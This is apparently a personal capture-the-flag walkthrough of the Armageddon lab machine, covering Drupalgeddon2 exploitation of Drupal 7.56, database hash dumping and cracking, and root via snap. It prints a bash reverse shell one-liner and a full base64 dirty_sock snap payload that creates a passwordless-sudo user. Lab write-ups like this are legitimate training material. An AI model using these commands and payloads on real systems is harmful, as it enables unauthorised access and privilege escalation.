# Armageddon

Armageddon

Monday, 14 February 2022

12:35 am

This is a Linux machine.

The target IP is 10.10.10.233.

My IP is 10.10.16.9.

&#x20;

Ran a port scan, as usual.

!\[\[37\_Armageddon\_image001.png]]

&#x20;

SSh and HTTP, let's see what's up with this. Did a more in-depth scan and revealed that this is indeed Drupal 7.

!\[\[37\_Armageddon\_image002.png]]

&#x20;

Ran a vulnerability scan against the port using nmap.

Drupal 7 has a boat load of vulnerabilities, but we don't know the specific version, so we would need to delve into the website to view it.

&#x20;

There seems to be a lot to report regarding this website.

&#x20;

!\[\[37\_Armageddon\_image003.png]]

Also, there's a crap ton of directories. This is an example of how NOT to build a website.

&#x20;

!\[\[37\_Armageddon\_image004.png]]

&#x20;

Particularly, I'm interested in that CHANGELOG.txt, which should contain something about versions. We can see that this is running Drupal 7.56.

!\[\[37\_Armageddon\_image005.png]]

&#x20;

There are quite few exploits to choose from.

!\[\[37\_Armageddon\_image006.png]]

&#x20;

There are RCEs, which would allow for my reverse shelling.

Ran the Drupalgeddon2 RCE,

&#x20;

!\[\[37\_Armageddon\_image007.png]]

Managed to get a reverse shell kind of.

&#x20;

!\[\[37\_Armageddon\_image008.png]]

So anyways, when in this form, we can see that we have a shell.php placed there by the code.

!\[\[37\_Armageddon\_image009.png]]

&#x20;

Upon viewing, we can see that this is a basic PHP shell.

{width="8.354166666666666in" height="0.7291666666666666in"}

&#x20;

Simple, paramter =c and we can execute commands. Tested this in the browser.

!\[\[37\_Armageddon\_image0011.png]]

&#x20;

From here, open a listener port and let's begin launching my bash reverse shell.

&#x20;

&#x20;

&#x20;

!\[\[37\_Armageddon\_image0012.png]]

Took a while, but basically just use this.

Ensure that you URL encode the '&'. Why? Because if we don't, the web browser will think that this is another query to be passed.

bash -i >& /dev/tcp/10.0.0.1/8080 0>&1

\* \*

From this we would get a shell.

&#x20;

!\[\[37\_Armageddon\_image0013.png]]

&#x20;

Pretty cool.

&#x20;

Looking around, we can google and see that Drupal requires the password settings to be contained inside /sites/default/settings.

&#x20;

This would basically give me what to do.

&#x20;

Looking at the code, we can see that there's one single database that we can take.

!\[\[37\_Armageddon\_image0014.png]]

Additionally, there's a hash salt, which I would normally take note of, but in this case I do not suspect there to be hashes to look through.

&#x20;

Anyways, I can see that we are unable to access the /home directory.

&#x20;

We can do so by doing cat /etc/passwd.

!\[\[37\_Armageddon\_image0015.png]]

Weirdly, it's giving me this system error instead of authentication error when I try to switch user to that of brucetherealadmin.

&#x20;

!\[\[37\_Armageddon\_image0016.png]]

Anyways this clearly isn't the method to solve the box. Something to do with the MySQL database has to be exploited.

I tried this command and it worked, because we instantly got all the tables from the database out.

&#x20;

!\[\[37\_Armageddon\_image0017.png]]

For some odd reason, mysqldump was not working out for me, despite using the same variables as this one did.

Looking at the table list, we can see a user's table within this.

!\[\[37\_Armageddon\_image0018.png]]

Anyways, from here, we can dump out the hash that is being used.

!\[\[37\_Armageddon\_image0019.png]]

&#x20;

From here, we can decrypt that hash, looks to be some kind of SHA hash. I certainly hope that I do not need that salt now.

&#x20;

We found the password with john.

&#x20;

{width="9.385416666666666in" height="2.46875in"}

Now, let's try to SSH in, which will work.

&#x20;

{width="7.958333333333333in" height="1.65625in"}

&#x20;

Ran a quick sudo -l, and we can see that we can run snap on the machine.

{width="7.96875in" height="2.1666666666666665in"}

A quick trip to GTFObins reveals that we can indeed use this to do stuff.

&#x20;

!\[\[37\_Armageddon\_image0023.png]]

Basically, I can see that we are supposed to make use of the fact that we can literally install everything.

&#x20;

Ok, anyways get FPM and compile the binary on our attacker machine. The victim machine does not have wget, but it does have curl.

&#x20;

Transfer it over and we can just wait for it to compile.

&#x20;

!\[\[37\_Armageddon\_image0024.png]]

Well this didn't work no matter how many times I tried it.

&#x20;

Moving on, we should try others. We should first identify the version of snap being used, because there's another exploit called dirty\_sock that we can exploit.

&#x20;

!\[\[37\_Armageddon\_image0025.png]]

This is indeed vulnerable to dirty\_sock, as it works for 2.37.1 and lower.

&#x20;

So in this case, let's just take the payload of the script and just run that instead. After which, we need to compile it to a .snap file.

!\[\[37\_Armageddon\_image0026.png]]

python2 -c 'print "aHNxcwcAAAAQIVZcAAACAAAAAAAEABEA0AIBAAQAAADgAAAAAAAAAI4DAAAAAAAAhgMAAAAAAAD//////////xICAAAAAAAAsAIAAAAAAAA+AwAAAAAAAHgDAAAAAAAAIyEvYmluL2Jhc2gKCnVzZXJhZGQgZGlydHlfc29jayAtbSAtcCAnJDYkc1daY1cxdDI1cGZVZEJ1WCRqV2pFWlFGMnpGU2Z5R3k5TGJ2RzN2Rnp6SFJqWGZCWUswU09HZk1EMXNMeWFTOTdBd25KVXM3Z0RDWS5mZzE5TnMzSndSZERoT2NFbURwQlZsRjltLicgLXMgL2Jpbi9iYXNoCnVzZXJtb2QgLWFHIHN1ZG8gZGlydHlfc29jawplY2hvICJkaXJ0eV9zb2NrICAgIEFMTD0oQUxMOkFMTCkgQUxMIiA+PiAvZXRjL3N1ZG9lcnMKbmFtZTogZGlydHktc29jawp2ZXJzaW9uOiAnMC4xJwpzdW1tYXJ5OiBFbXB0eSBzbmFwLCB1c2VkIGZvciBleHBsb2l0CmRlc2NyaXB0aW9uOiAnU2VlIGh0dHBzOi8vZ2l0aHViLmNvbS9pbml0c3RyaW5nL2RpcnR5X3NvY2sKCiAgJwphcmNoaXRlY3R1cmVzOgotIGFtZDY0CmNvbmZpbmVtZW50OiBkZXZtb2RlCmdyYWRlOiBkZXZlbAqcAP03elhaAAABaSLeNgPAZIACIQECAAAAADopyIngAP8AXF0ABIAerFoU8J/e5+qumvhFkbY5Pr4ba1mk4+lgZFHaUvoa1O5k6KmvF3FqfKH62aluxOVeNQ7Z00lddaUjrkpxz0ET/XVLOZmGVXmojv/IHq2fZcc/VQCcVtsco6gAw76gWAABeIACAAAAaCPLPz4wDYsCAAAAAAFZWowA/Td6WFoAAAFpIt42A8BTnQEhAQIAAAAAvhLn0OAAnABLXQAAan87Em73BrVRGmIBM8q2XR9JLRjNEyz6lNkCjEjKrZZFBdDja9cJJGw1F0vtkyjZecTuAfMJX82806GjaLtEv4x1DNYWJ5N5RQAAAEDvGfMAAWedAQAAAPtvjkc+MA2LAgAAAAABWVo4gIAAAAAAAAAAPAAAAAAAAAAAAAAAAAAAAFwAAAAAAAAAwAAAAAAAAACgAAAAAAAAAOAAAAAAAAAAPgMAAAAAAAAEgAAAAACAAw" + "A"\*4256 + "=="' | base64 -d > exploit.snap

&#x20;

That's the command.

&#x20;

After which, we just upload this and try to install it.

&#x20;

Run it according to the code given by GTFObins.

!\[\[37\_Armageddon\_image0027.png]]

&#x20;

Afterwards, we have basically created a user that has username\&password = dirty\_sock.

&#x20;

This would hence be able to run sudo.

&#x20;

Sudo su root, and enter the password for the dirty\_sock and we are root now.

&#x20;

{width="7.09375in" height="3.2604166666666665in"}

Rooted.
